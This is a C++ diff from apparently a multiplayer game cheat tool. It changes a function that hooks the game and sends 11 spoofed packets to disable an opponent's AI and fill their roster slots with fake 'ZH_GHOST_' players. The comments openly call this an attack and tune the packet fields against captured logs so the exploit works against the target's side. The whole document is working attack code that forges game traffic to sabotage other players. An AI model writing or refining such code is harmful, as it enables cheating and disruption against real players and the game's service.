@@ -659,13 +659,16 @@ bool ai_control::SendDisableOpponentAi()
     //      it replaced opponent's real name with ZH_BOT. Skipping keeps
     //      their captain visible while 9 non-captain slots still fill
     //      with ghost bots.
-    // Reproducing disable_vs_ai_2.log attack byte-for-byte:
-    //   - 11 packets, slots 0..0x0A (captain included, no skip)
-    //   - buf[0] = oppSide (0x00 in the captured log = HOME target)
-    //   - buf[1] = slot, buf[2] = 0xFF, buf[3] = slot mirror
-    //   - Fixed 9-char gamertag "ZH_GHOST_" on ALL 11 packets
-    //     (working log used "PROLLYZAA" — not per-slot differentiated)
-    //   - spoof_call 6th arg = 0x01 (log shows Slot=0x01), NOT 0xFF
+    // Log-verified pattern: a6 (6th arg of spoof_call) switches with
+    // the target side. disable_vs_ai_2 (HOME target): buf[0]=0x00,
+    // a6=0x01. disable_ai_and_crash (AWAY target): buf[0]=0x01, a6=0x00.
+    // Pattern: a6 = 1 - buf[0] = mySide (the attacker's own side).
+    //   - 11 packets, slots 0..0x0A (captain included)
+    //   - buf[0] = oppSide (target)
+    //   - a6 = mySide (who we are — switches 0x00/0x01)
+    //   - buf[1]=slot, buf[2]=0xFF, buf[3]=slot
+    //   - Fixed 9-char gamertag on all 11 (working used "PROLLYZAA")
+    const char a6 = static_cast<char>(mySide);
     hook::g_allow_attack_send = true;
     for (uint8_t slot = 0; slot < 0x0B; ++slot) {
         __stosb(reinterpret_cast<unsigned char*>(buf), 0, 0x38);
@@ -675,24 +678,21 @@ bool ai_control::SendDisableOpponentAi()
         buf[2] = 0xFF;
         buf[3] = slot;
 
-        // Fixed gamertag (9 chars) at offset 24 — identical on all packets.
         static const unsigned char kTag[9] = { 'Z','H','_','G','H','O','S','T','_' };
         for (int i = 0; i < 9; ++i) buf[24 + i] = kTag[i];
 
         __try {
             spoof_call(fn, (uint64_t)rcx,
                        (uint64_t*)&opcode, (uint64_t*)&opcode,
-                       (void*)buf, (int)0x38,
-                       (char)0x01,          // 6th arg = 0x01 (matches working log Slot=0x01)
-                       (unsigned char)0);
+                       (void*)buf, (int)0x38, a6, (unsigned char)0);
             ++sent;
         } __except (EXCEPTION_EXECUTE_HANDLER) { ++threw; }
     }
     hook::g_allow_attack_send = false;
 
     log::debugf(
-        "[AI] RosterSpoof: 0xFAE6B64D playerside=%d mySide=%u oppSide=%u (11 pkts 0..0xA, tag=ZH_GHOST_, slot-arg=0x01) sent=%d threw=%d\r\n",
-        sliders::playerside, mySide, oppSide, sent, threw);
+        "[AI] RosterSpoof: 0xFAE6B64D playerside=%d mySide=%u oppSide=%u a6=0x%02X (11 pkts 0..0xA) sent=%d threw=%d\r\n",
+        sliders::playerside, mySide, oppSide, (unsigned)(uint8_t)a6, sent, threw);
 
     if (sent == 11 && threw == 0) {
         g_rosterSpoofFired = true;
